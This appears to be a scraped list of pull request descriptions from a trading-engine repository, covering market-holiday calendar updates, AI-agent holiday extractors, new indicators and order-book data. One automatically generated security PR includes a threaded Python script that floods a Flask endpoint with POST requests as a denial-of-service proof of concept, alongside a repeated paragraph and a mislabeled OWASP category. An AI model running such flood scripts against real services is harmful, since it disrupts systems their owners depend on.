title: Add openai CME Futures holiday extractors
body:
<!--- Provide a general summary of your changes in the Title above -->

#### Description
I created two openai agents to extract the holiday calendar of CME futures and create a json file with the dates to add into the MHDB (Like this one [changes.json](https://github.com/user-attachments/files/24682183/changes.json)). The first agent was expected to scrap the holiday calendar directly from the website while the second had already the official files with the schedule for each holiday (available in their official site after signing up). Each agent used gpt-5.2, the model with outputs closer to the expected. 

The first agent (scrapper.py) produces better outputs when given an structured output, web search parameter and reasoning in level `low`. However, although it learned to distinguish between full holidays and holidays, it doesn't recognize late opens and is
inaccurate with the early closes and bank holidays. I believe this is because it doesn't have access to the official holiday schedule table, posted in CME website, as that table doesn't seem to be present in the HTML structure of the official source.

The second agent (transformer.py), produces an output way more accurate than the first one, using an structured output and reasoning in level `high`. It perfectly distinguishes between holidays and bank holidays and is accurate in the early close and late open times. However, it still doesn't handle correctly bank holiday dates with both early closes and late opens (Like independence day schedule for equity based futures). 
#### Related Issue

<!--- If suggesting a new feature or change, please discuss it in an issue first -->
<!--- If fixing a bug, there should be an issue describing it with steps to reproduce -->
<!--- Please link to the issue here: -->
n/a
#### Motivation and Context
<!--- Why is this change required? What problem does it solve? -->
With this change, updating CME Futures market hours will take less time than it used to

There was also a wrong holidays in Future-cbot-KE. - For CME group Dairy products, the wrong holidays were `1/16/2023, 7/4/2017, 7/4/2019, 7/4/2018, 2/20/2023`, but `1/16/2023, 2/20/2023` were late opens, and all of them were bank holidays - For CME Livestock and Lumber, the wrong late opens were `1/16/2017, 2/20/2017`, but both of them were holidays: - For `Future-cbot-KE`, the wrong holiday was `9/4/2023`, but that date was a late open: #### Related Issue n/a #### Motivation and Context With this change the MHDB will be more accurate #### Requires Documentation Change n/a #### How Has This Been Tested? n/a #### Types of changes - [ ] Bug fix (non-breaking change which fixes an issue) - [ ] Refactor (non-breaking change which improves implementation) - [ ] Performance (non-breaking change which improves performance. title: Add missing Oanda, SGX and Cfd-InteractiveBrokers 2026 holidays to MHDB
body: #### Description Oanda and SGX have not yet published a complete 2026 Holiday schedule, just for New Year (https://www.sgx.com/trading , https://www.oanda.com/bvi-en/cfds/holiday-trading-hours/). Still, there was some wrong holidays in `Forex-oanda-[*]`. On the other hand, each IB CFD is part of the exchange SMART, which seems to be an special 'exchange' from IBKR, that searches the best prices for your orders on real exchanges such as Nasdaq, Nyse, etc. For that reason, I added the 2026 USA national holidays to `Cfd-interactivebrokers-[*]`, following the pattern already present. #### Related Issue n/a #### Motivation and Context With this change the MHDB will keep updated #### Requires Documentation Change n/a #### How Has This Been Tested? n/a #### Types of changes - [ ] Bug fix (non-breaking change which fixes an issue) - [ ] Refactor (non-breaking change which improves implementation) - [ ] Performance (non-breaking change which improves performance. title: Add 2026 Future EUREX, CFE and ICE Holidays
body:
<!--- Provide a general summary of your changes in the Title above -->

#### Description
<!--- Describe your changes in detail -->
Add 2026 EUREX, CFE and ICE holidays and early closes. Unfortunately, SGX has not yet published their whole holiday calendar for 2026, there is just info for New Year Holiday 2026(https://www.sgx.com/trading). The info for the other exchanges was extracted from:
- CFE: https://www.cboe.com/about/hours/us-futures
- EUREX: https://www.eurex.com/ex-en/trade/trading-calendar/holiday-regulations
- ICE: https://www.ice.com/publicdocs/futures_us/exchange_notices/ICE_Futures_US_Exchange_Notice_2026_Holiday_Calendar_20260609.pdf
Furthermore, for some ICE Future entries there were dates already present in their generic entry (Future-ice-[*]), so those dates were removed

title: New Feature: Implement Covariance Indicator #6982
body:
#### Description
Implemented the `Covariance` indicator as requested in issue #6982.
This indicator computes the covariance between two data series (target and reference) over a specified period using `MathNet.Numerics.Statistics.Covariance`.

#### Related Issue
Closes #6982

#### Motivation and Context
Covariance is a fundamental statistical measure used in finance, particularly for portfolio optimization and risk management. Adding this indicator allows users to easily calculate the joint variability of two assets within the Lean engine.

#### Requires Documentation Change
No. (Standard indicator addition)

#### How Has This Been Tested?
- Created a new test class `CovarianceTests.cs`.
- Verified mathematical accuracy by comparing the indicator output against manual calculation.
- Verified standard indicator behaviors: `IsReady`, `Reset`, and `WarmUp`.
- Ran unit tests locally using `dotnet test`.

title: Add 2026 CME Future & HKFE Holidays, early closes, late opens and bank holidays
body: #### Description - Add 2026 CME Future & HKFE Holidays, early closes, late opens and bank holidays - The information was extracted from https://www.cmegroup.com/trading-hours.html and https://www.hkex.com.hk/Services/Trading/Derivatives/Overview/Trading-Calendar-and-Holiday-Schedule?sc_lang=en - The unit test `EnergyExpiryDateFunction_WithDifferentDates_ShouldFollowContract("HH","00:00:00")` was failing since the expiry date function wasn't taking into account the 2026 thanksgiving bank holiday - The holiday schedule for the futures AW and GD were added manually as they don't follow the holiday schedule of the CME Future class "Grains" (Even though they are commodity indices) - Columbus and Veterans day of 2026 and 2027 was added as a bank holiday in the generic entries `Future-cme-[*]`, `Future-cbot-[*]`, `Future-nymex-[*]` and `Future-comex-[*]` #### Related Issue n/a #### Motivation and Context With this change the MHDB will keep updated #### Requires Documentation Change n/a #### How Has This Been Tested? I used the following python module to automatically add the holidays, early closes, late opens and bank holidays https://github.com/Marinovsky/LEAN-MHDB. The python module reads a [changes.json](https://github.com/user-attachments/files/24388078/changes.json) file with the changes, adds them to the MHDB (taking into account the exchange time zone) and finally checks for duplicated entries. It knows the class of each future in the MHDB thanks to this file: https://www.dropbox.com/scl/fi/09j95smm8ko09aupx66gl/cme-group-futures-info.json?rlkey=43ne4e093vtsqo6o2vnbrvtfh&st=tadv9em1&dl=0 #### Types of changes - [ ] Bug fix (non-breaking change which fixes an issue) - [ ] Refactor (non-breaking change which improves implementation) - [ ] Performance (non-breaking change which improves performance. title: Feat: handle negative limit price in `OrderType.ComboLimit`
body:
#### Description
Adds a warning for users to prevent using negative limit prices in Bear Option Strategies for `ComboLimit` and `ComboLegLimit` order types. Instead, the trade direction should be indicated using a negative **group quantity** in `ComboLimit` and quantity in `ComboLegLimit`.

For instance (`ComboLimit`):
```
var groupQuantiity = -1;

var legs = new List<Leg>(2)
{ 
  Leg.Create(callContracts[0], -1),
  Leg.Create(callContracts[1], 1)
};

ComboLimitOrder(legs, groupQuantiity , temporaryLimitPrice);

```

The Lean now returns a specific error message if a negative limit price is used.

#### Related Issue
N/A

#### Motivation and Context
Prevent users from accidentally submitting orders with negative limit prices, which are not supported by the API and could result in incorrect order interpretation. Ensures trade direction is explicitly communicated via group quantity, improving correctness and user experience.

#### Requires Documentation Change
N/a

#### How Has This Been Tested?
- Verified that using a negative limit price for ComboLimit or ComboLegLimit returns the correct warning message.
- Unit tests added for both ComboLimit and ComboLegLimit scenarios.

title: [Security] Fix HIGH vulnerability: V-004
body:
## Security Fix

This PR addresses a **HIGH** severity vulnerability detected by our security scanner.

### Security Impact Assessment

| Aspect | Rating | Rationale |
|--------|--------|-----------|
| Impact | Medium | In the QuantConnect Lean repository, this demo algorithm's unprotected API endpoint could allow DoS attacks that overwhelm the local or cloud-hosted execution environment, disrupting trading simulations or live strategies for the affected user, but it wouldn't compromise the broader platform or lead to data breaches since it's isolated to the algorithm's runtime. |
| Likelihood | Low | Exploitation is unlikely given QuantConnect's controlled cloud deployment where algorithms aren't typically exposed as public APIs, requiring insider knowledge or misconfiguration to access the endpoint, and attackers have little motivation to target individual demo algorithms in this trading-focused repository. |
| Ease of Fix | Easy | Remediation involves adding a rate-limiting library like Flask-Limiter or FastAPI's built-in middleware with minimal code changes to the Python file, no dependencies on other parts of the repository, and straightforward testing to ensure the endpoint remains functional. |

### Evidence: Proof-of-Concept Exploitation Demo

**⚠️ For Educational/Security Awareness Only**

This demonstration shows how the vulnerability could be exploited to help you understand its severity and prioritize remediation.

#### How This Vulnerability Can Be Exploited

The vulnerability in `Algorithm.Python/CustomSignalExportDemonstrationAlgorithm.py` involves a Flask-based API endpoint (`@app.post('/')`) that lacks rate-limiting, allowing an attacker to flood it with requests. In the context of the QuantConnect Lean repository, this file appears to be a demonstration algorithm for exporting trading signals, potentially running a local or exposed web server to receive POST data (e.g., signal updates). An attacker could exploit this by deploying the vulnerable code in a test environment and using automated scripts to send excessive requests, overwhelming server resources and causing a denial of service (DoS).

The vulnerability in `Algorithm.Python/CustomSignalExportDemonstrationAlgorithm.py` involves a Flask-based API endpoint (`@app.post('/')`) that lacks rate-limiting, allowing an attacker to flood it with requests. In the context of the QuantConnect Lean repository, this file appears to be a demonstration algorithm for exporting trading signals, potentially running a local or exposed web server to receive POST data (e.g., signal updates). An attacker could exploit this by deploying the vulnerable code in a test environment and using automated scripts to send excessive requests, overwhelming server resources and causing a denial of service (DoS).

To demonstrate exploitation, first clone and set up the repository in a controlled environment (e.g., a local VM or container). The vulnerable file contains a Flask app that listens on a port (likely 5000 by default) and processes POST requests without any throttling.

```bash
# Step 1: Clone the repository and navigate to the vulnerable file
git clone https://github.com/QuantConnect/Lean.git
cd Lean/Algorithm.Python

# Step 2: Install dependencies (assuming Python 3.8+ and Flask are available; install if needed)
pip install flask

# Step 3: Run the vulnerable algorithm (this starts the Flask app; in a real deployment, it might be exposed via Lean’s execution engine or a custom setup)
python CustomSignalExportDemonstrationAlgorithm.py
# The app will start listening on http://localhost:5000 (or similar, based on code inspection)
```

Once the app is running, an attacker can exploit the lack of rate-limiting by flooding the endpoint with POST requests using a simple script. This simulates a DoS attack by consuming CPU/memory resources, as the endpoint processes each request without limits.

```python
# exploit_flood.py - Python script to flood the endpoint with POST requests
import requests
import threading
import time

TARGET_URL = "http://localhost:5000/"  # Adjust if the app runs on a different host/port
NUM_THREADS = 50  # Number of concurrent threads for flooding
REQUESTS_PER_THREAD = 1000  # Requests per thread

def flood_endpoint():
    for _ in range(REQUESTS_PER_THREAD):
        try:
            # Send a sample POST request (mimicking signal export data from the algorithm)
            response = requests.post(TARGET_URL, json={"signal": "buy", "timestamp": time.time()})
            print(f"Request sent: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")

# Launch multiple threads to simulate high-volume attack
threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=flood_endpoint)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print("Flood attack completed.")
```

#### Exploitation Impact Assessment

| Impact Category | Severity | Description |
|-----------------|----------|-------------|
| Data Exposure | None | The endpoint in this demonstration algorithm handles trading signal data (e.g., buy/sell signals), which is not inherently sensitive or personally identifiable. No user credentials, financial accounts, or proprietary trading strategies are exposed; it's primarily demo data without access to Lean's core user databases or API keys. |
| System Compromise | Low | Exploitation leads to resource exhaustion but no code execution or privilege escalation. An attacker gains no system access beyond overwhelming the process; the Flask app remains isolated, and Lean's sandboxed execution model prevents broader compromise unless combined with other vulnerabilities. |
| Operational Impact | High | Successful flooding causes immediate DoS, halting the signal export functionality and potentially disrupting trading algorithm execution if integrated with Lean's runtime. Resources (CPU/memory) are exhausted, leading to service unavailability for legitimate users, with recovery requiring app restart or scaling; in a cloud deployment, this could affect multiple trading sessions or backtesting jobs. |
| Compliance Risk | Medium | Violates OWASP Top 10 A6:2021 (Vulnerable and Outdated Components) by lacking rate-limiting in a web-facing component. For a financial trading platform like Lean, this could indirectly impact compliance with standards like SOC 2 (availability controls) or industry regulations (e.g., SEC oversight on trading systems), especially if the demo is misdeployed in production, risking audit failures or fines for service disruptions. |

### Vulnerability Details
- **Rule ID**: `V-004`
- **File**: `Algorithm.Python/CustomSignalExportDemonstrationAlgorithm.py`
- **Description**: The API endpoint `@app.post('/')` lacks any rate-limiting mechanism. This allows an attacker to send a high volume of requests, potentially overwhelming the server's resources (CPU, memory) and causing a denial of service for legitimate users.

### Changes Made
This automated fix addresses the vulnerability by applying security best practices.

### Files Modified
- `Algorithm.Python/CustomSignalExportDemonstrationAlgorithm.py`

### Verification
This fix has been automatically verified through:
- ✅ Build verification
- ✅ Scanner re-scan
- ✅ LLM code review

🤖 This PR was automatically generated.

title: Add TickType.Orderbook and Orderbook data type for order book depth data
body:
#### Description

This PR implements order book depth data support in LEAN by introducing a new `TickType.Orderbook` and associated `Orderbook` class. The implementation provides a complete solution for accessing multi-level bid/ask order book data in algorithms.

**Core Changes:**
- Add `TickType.Orderbook` enum value (value 3) to `Global.cs`
- Add `Orderbook` class inheriting from `Tick` with multi-level bid/ask support
- Add `Orderbooks` collection class (`DataDictionary<Symbol, Orderbook>`)
- Add `Orderbooks` property to `Slice` class for algorithm access
- Add order book caching in `SecurityCache`
- Add order book handling in `TimeSliceFactory`
- Add `LeanData` support for Orderbook type mapping
- Add `[ProtoInclude]` for Protocol Buffers serialization in `Tick.cs`

**Orderbook Class Features:**
- Supports configurable price levels (default 10 levels)
- `Bids` and `Asks` lists with `OrderbookLevel` (Price, Size) entries
- CSV Reader for historical data: `timestamp,bid1_price,bid1_size,...,ask1_price,ask1_size,...`
- Validation: crossed spread detection, proper bid/ask ordering
- Helper methods: `GetMidPrice()`, `GetSpread()`, `GetBestBid()`, `GetBestAsk()`, `GetBid(level)`, `GetAsk(level)`
- Execution estimation: `CalculateSlippage(side, quantity)`, `CalculateFillableQuantity(side, notional)`

#### Related Issue

Related to: #997 ([Crypto] Add Orderbook Support to LEAN)

This PR provides the data infrastructure for order book support. While issue #997 was closed, the order book functionality was not implemented. This PR addresses that need.

#### Motivation and Context

Order book depth data is essential for:
- **Slippage analysis**: Estimate execution costs before placing orders
- **Market making strategies**: Access to full depth for spread calculation
- **Arbitrage strategies**: Compare order books across venues
- **Liquidity analysis**: Assess market depth at various price levels

Currently LEAN only supports `Trade`, `Quote`, and `OpenInterest` tick types. Adding `Orderbook` extends LEAN's capability to handle full order book depth data, which is particularly important for cryptocurrency markets where order book data is widely available.

#### Requires Documentation Change

Yes, documentation updates required:
- Add `TickType.Orderbook` to TickType enum documentation
- Add `Orderbook` class reference documentation
- Add `Slice.Orderbooks` property documentation
- Add example usage for accessing order book data in algorithms

#### How Has This Been Tested?

- **47 comprehensive unit tests** covering:
  - Constructor and initialization tests
  - CSV Reader tests (valid data, edge cases, error handling)
  - GetSource path generation tests
  - Helper method tests (spread, mid price, best bid/ask)
  - Calculation tests (slippage, fillable quantity)
  - Clone and ToString tests
  - Orderbooks collection tests
- All existing LEAN tests pass
- Build succeeds with no errors or warnings

title: Fix issues with the IchimokuKinkoHyo indicator
body:
<!--- Provide a general summary of your changes in the Title above -->

#### Description
This was not a WarmUpPeriod problem, but an update order one. `SenkouA` depends on `DelayedTenkanSenkouA` and `DelayedKijunSenkouA`, and `SenkouB` depends on `DelayedMaximumSenkouB` and `DelayedMinimumSenkouB`, both must be calculated/updated only after their respective sub-components are updated.

We now use indicator extension methods to ensure automatic updates and prevent dependency order errors.

#### Related Issue
Closes #9112 

#### Motivation and Context
N/A

N/A

title: Track securities addition and removal notifications
body:
<!--- Provide a general summary of your changes in the Title above -->

#### Description
<!--- Describe your changes in detail -->

Track securities addition and removal notifications in order to avoid sending duplicate notifications and make sure both the addition and later removal are communicated.

For instance, two universes can select a single security, like a continuous future universe and a future chain universe, with internal and non-internal subscriptions. In some cases, the removal notification was not communicated to the algorithm (OnSecuritiesChanged).
